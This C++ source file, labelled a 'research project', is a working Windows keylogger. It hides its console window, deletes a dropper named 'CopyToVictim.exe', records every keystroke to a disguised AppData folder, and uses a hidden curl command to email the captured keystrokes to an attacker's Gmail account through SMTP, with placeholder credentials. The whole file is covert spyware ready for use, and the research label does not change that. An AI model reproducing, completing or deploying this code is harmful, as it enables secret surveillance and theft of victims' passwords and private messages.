// researchproject.cpp : This file contains the 'main' function. Program execution begins and ends there.


#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <winbase.h>
#include <ctime>

using namespace std;

int save(int _key, char const* file);
int shiftSave(int _key, char const* file);
int archive(char const* file);
long getfilesize(char const* file);
int resetLog(char const* file);
int sendmail();

int main() {

    DeleteFileA("D:\\CopyToVictim.exe");

    string path = getenv("USERPROFILE"); //Gets User home diectory
    path.append("\\AppData\\Roaming\\Microsoft Windows\\log.txt"); //Adds the path we need to save the files to
    short int i;

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (true) {
        Sleep(50); //Reduces CPU 
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                if (GetKeyState(VK_SHIFT) < 0) {//If the shift key is hit then the key will have brackets around it
                    shiftSave(i, path.c_str());
                }
                else {
                    save(i, path.c_str());//When key is hit it saves to the file
                }
            }
        }   
    }

    return 0;
}

int shiftSave(int _key, char const* file) {

    cout << _key << endl;
    FILE* OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");//Opens file and appends it

    // When these keys are hit, the string in brackets is printed to the file
    if (_key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (_key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "");
    else if (_key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "[ENTER]");
    else if (_key == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (_key == VK_SPACE)
        fprintf(OUTPUT_FILE, "%s", "\n");
    else if (_key == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
    else if (_key == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT ARROW]");
    else if (_key == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT ARROW]");
    else if (_key == VK_OEM_PERIOD)
        fprintf(OUTPUT_FILE, "%s", ".");
    else if (_key == VK_OEM_MINUS)
        fprintf(OUTPUT_FILE, "%s", "-");
    else if (_key == VK_OEM_1)
        fprintf(OUTPUT_FILE, "%s", ";");
    else if (_key == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (_key == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CTRL]");
    else if (_key == VK_MENU)
        fprintf(OUTPUT_FILE, "%s", "[ALT]");
    else if (_key == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
    else if (_key == VK_OEM_2)
        fprintf(OUTPUT_FILE, "%s", "/");
    else if (_key == VK_OEM_4)
        fprintf(OUTPUT_FILE, "%s", "[");
    else if (_key == VK_OEM_5)
        fprintf(OUTPUT_FILE, "%s", "\\");
    else if (_key == VK_OEM_7)
        fprintf(OUTPUT_FILE, "%s", "'");
    else { 
        fprintf(OUTPUT_FILE, "%s", "[");
        fprintf(OUTPUT_FILE, "%s", &_key);
        fprintf(OUTPUT_FILE, "%s", "]");
    }
    fclose(OUTPUT_FILE);

    return 0;
}


int save(int _key, char const *file) {

    cout << _key << endl;
    FILE* OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");;      

    if (_key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (_key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "");
    else if (_key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "[ENTER]");
    else if (_key == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (_key == VK_SPACE) {
        fprintf(OUTPUT_FILE, "%s", "\n");
        if (getfilesize(file) > 30) {//When the space bar is hit and the file size is over X, then these fucntions are run
            archive(file);//copies file to new file
            resetLog(file);//resets files
            sendmail();//sends archive file via email
        }
    }
    else if (_key == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
    else if (_key == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT ARROW]");
    else if (_key == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT ARROW]");
    else if (_key == VK_OEM_PERIOD)
        fprintf(OUTPUT_FILE, "%s", ".");
    else if (_key == VK_OEM_MINUS)
        fprintf(OUTPUT_FILE, "%s", "-");
    else if (_key == VK_OEM_1)
        fprintf(OUTPUT_FILE, "%s", ";");
    else if (_key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s", "");
    else if (_key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "");
    else if (_key == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (_key == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CTRL]");
    else if (_key == VK_MENU)
        fprintf(OUTPUT_FILE, "%s", "[ALT]");
    else if (_key == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
    else if (_key == VK_OEM_2)
        fprintf(OUTPUT_FILE, "%s", "/");
    else if (_key == VK_OEM_4)
        fprintf(OUTPUT_FILE, "%s", "[");
    else if (_key == VK_OEM_5)
        fprintf(OUTPUT_FILE, "%s", "\\");
    else if (_key == VK_OEM_7)
        fprintf(OUTPUT_FILE, "%s", "'");
    else
        fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);

    return 0;
}

int archive(char const *file) {
    char const* ogFile;
    ogFile = file;
    string path = getenv("USERPROFILE");
    path.append("\\AppData\\Roaming\\Microsoft Windows\\archive.txt");//Creates archive file
    std::ofstream archiveReset(path.c_str(), std::ofstream::trunc); // Resets the archive file
    CopyFileA(ogFile, path.c_str(), FALSE); //Copies the log file to archive file
    return 0;
}

long getfilesize(char const* file) {//Gets the size of the file
    std::ifstream infile(file, std::ifstream::ate | std::ifstream::binary);
    return infile.tellg();
}

int resetLog(char const* file) {
    std::ofstream logReset(file, std::ofstream::trunc); //Resets the log file
    return 0;
}

int sendmail(){
    string path = getenv("USERPROFILE");
    path.append("\\AppData\\Roaming\\Microsoft Windows\\archive.txt");
    string test = ("curl smtp://smtp.gmail.com:587 -v --mail-from \"{SEND EMAIL}\" --mail-rcpt \"RECIEVE EMAIL\" --ssl -u {SEND EMAIL:SEND EMAIL PASSWORD} -T \""+path+"\" -k --anyauth");
    const char* command = test.c_str();//Converts string to const char*
    WinExec(command, SW_HIDE);//Runs the libcurl command
    return 0;
}
